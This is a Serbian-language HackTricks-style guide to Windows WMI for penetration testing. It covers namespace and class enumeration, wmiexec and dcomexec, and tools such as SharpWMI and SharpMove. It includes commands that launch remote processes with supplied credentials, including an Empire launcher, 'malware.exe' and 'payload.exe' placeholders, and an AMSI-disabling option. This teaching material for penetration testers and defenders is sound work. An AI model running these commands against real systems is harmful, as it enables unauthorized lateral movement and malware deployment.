# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Objašnjenje načina rada

Procesi se mogu otvoriti na hostovima za koje su poznati korisničko ime i lozinka ili hash, korišćenjem WMI-ja. Wmiexec izvršava komande pomoću WMI-ja, pružajući polu-interaktivno iskustvo shell-a.

**dcomexec.py:** Korišćenjem različitih DCOM endpoint-a, ova skripta pruža polu-interaktivni shell sličan onom koji pruža `wmiexec.py`. Izabrana vrednost `-object` određuje endpoint; podržani objekti uključuju `MMC20.Application`, `ShellWindows` i `ShellBrowserWindow`, pri čemu poslednji pruža tehniku Shell Browser Window istaknutu u originalnom vodiču.<sup>[[2]](#references)[[3]](#references)</sup>

## Osnove WMI-ja

### Namespace

Organizovan u hijerarhiji nalik strukturi direktorijuma, WMI-jev kontejner najvišeg nivoa je \root, ispod kojeg su organizovani dodatni direktorijumi, odnosno namespace-ovi.<sup>[[1]](#references)</sup>
Komande za izlistavanje namespace-ova:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klase unutar namespace-a mogu se izlistati pomoću:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klase**

Poznavanje naziva WMI klase, kao što je win32_process, i prostora imena u kojem se nalazi ključno je za svaku WMI operaciju.  
Komande za izlistavanje klasa koje počinju sa `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Pozivanje klase:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metode

Metode, koje su jedna ili više izvršivih funkcija WMI klasa, mogu se izvršiti.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI enumeracija

### Status WMI servisa

Komande za proveru da li je WMI servis operativan:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informacije o sistemu i procesima

Prikupljanje informacija o sistemu i procesima pomoću WMI-ja:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Za napadače, WMI je moćan alat za prikupljanje osetljivih podataka o sistemima ili domenima.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Daljinsko upitovanje WMI-ja za određene informacije, kao što su lokalni administratori ili prijavljeni korisnici, moguće je uz pažljivo formiranje komandi.

### **Ručno izvršavanje udaljenih WMI upita**

Neupadljiva identifikacija lokalnih administratora na udaljenom računaru i prijavljenih korisnika može se postići pomoću specifičnih WMI upita. `wmic` takođe podržava čitanje iz tekstualne datoteke radi istovremenog izvršavanja komandi na više čvorova.<sup>[[1]](#references)</sup>

Za daljinsko izvršavanje procesa putem WMI-ja, kao što je postavljanje Empire agenta, koristi se sledeća struktura komande, pri čemu je uspešno izvršavanje označeno povratnom vrednošću „0“:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Ovaj proces ilustruje WMI mogućnost udaljenog izvršavanja i enumeracije sistema, ističući njegovu korisnost kako za administraciju sistema tako i za penetration testing.

## Automatski alati

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Takođe možete koristiti **Impacket's `wmiexec`**.


## References

- [1] [Korišćenje akreditiva za preuzimanje kontrole nad Windows računarima - 3. deo (WMI i WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Vodič za početnike kroz Impacket Tool Kit, 1. deo – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
